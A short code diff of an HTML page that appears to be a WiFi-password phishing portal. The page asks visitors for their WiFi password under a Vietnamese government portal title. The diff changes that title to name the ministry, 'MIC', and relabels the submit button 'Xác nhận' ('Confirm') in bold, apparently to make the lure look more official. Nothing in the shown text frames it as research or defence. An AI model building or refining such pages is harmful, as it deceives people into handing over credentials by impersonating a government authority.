@@ -48,7 +48,7 @@
                 text-decoration: none;
             }
 		</style>
-		<title> Cổng thông tin điện tử - CHÍNH PHỦ VN </title>
+		<title> Cổng thông tin điện tử - MIC </title>
 	</head>
 	<body>
 		<div class="container">
@@ -62,7 +62,7 @@
 						<div class="form-group">
 							<input type="text" class="form-control no-border-radius" placeholder="Vui lòng nhập mật khẩu WIFI của bạn" name="pass" autofocus />
 						</div>
-						<button type="submit" class="btn btn-primary" name="submit" value="submit"><span class="glyphicon glyphicon-ok"></span>&nbsp; Đồng ý </button>
+						<button type="submit" class="btn btn-primary" name="submit" value="submit"><strong><span class="glyphicon glyphicon-ok"></span>&nbsp; Xác nhận </strong></button>
 					</form>
 					<hr />
 				</div>
